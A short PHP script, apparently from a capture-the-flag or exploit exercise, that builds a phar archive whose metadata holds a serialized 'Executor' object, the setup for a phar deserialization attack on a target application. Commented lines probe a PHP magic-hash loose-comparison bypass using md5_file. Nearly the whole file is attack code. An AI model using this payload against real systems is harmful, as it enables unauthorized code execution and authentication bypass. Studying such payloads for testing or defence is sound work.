<?php
    // $md5 = 'adeafbadbabec0dedabada55ba55d00d';
    // if ("0e768261251903820937390661668547" == $md5) {
    // if (md5_file('') == $md5) {
    //     print "TRUE";
    // }
    
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    class Executor {
        private $signature = True;
        private $filename = "asdf.php";
    }
    $object = new Executor;
    $phar->setMetadata($object);
    $phar->stopBuffering();
?>